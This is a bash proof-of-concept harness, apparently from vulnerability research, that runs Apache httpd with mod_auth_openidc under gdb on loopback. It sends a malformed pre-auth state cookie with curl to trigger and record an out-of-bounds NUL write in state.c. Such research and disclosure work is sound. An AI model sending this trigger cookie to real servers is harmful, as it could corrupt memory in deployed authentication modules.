#!/usr/bin/env bash
# Observe the out-of-bounds NUL store on the live pre-auth wire path in the
# non-ASan full module. Loopback only; child runs under gdb -X.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
SRC="$HERE/src/mod_auth_openidc-plain/src/state.c"
OUT="$HERE/evidence/plain-oob"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
rm -f "$HERE/httpd-plain.pid"
sleep 1
timeout 45 gdb -q -batch \
    -ex 'set pagination off' -ex 'set breakpoint pending on' \
    -ex "break $SRC:219" \
    -ex "run -f $HERE/httpd-plain.conf -X" \
    -ex 'printf "HIT STORE=%p BYTE=%02x PTR=%p STR=%s\n", cookie, *(unsigned char*)cookie, *(void**)cookie, *(char**)cookie' \
    -ex 'x/4gx cookie-16' \
    -ex 'next' \
    -ex 'printf "AFTER BYTE=%02x PTR=%p STR=%s\n", *(unsigned char*)cookie, *(void**)cookie, *(char**)cookie' \
    -ex 'bt 6' \
    --args "$HTTPD" >"$OUT/live-plain.txt" 2>&1 &
gp=$!
for i in 1 2 3 4 5 6; do
    code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
        -H 'Cookie: mod_auth_openidc_state_novalue' http://127.0.0.1:18090/protected 2>/dev/null || true)
    echo "attempt $i code=$code"
    [ "$code" != "000" ] && break
    sleep 2
done
wait "$gp"
"$HTTPD" -f "$HERE/httpd-plain.conf" -k stop >/dev/null 2>&1
grep -E 'HIT|#|Breakpoint|exited|SIG' "$OUT/live-plain.txt" | head -25
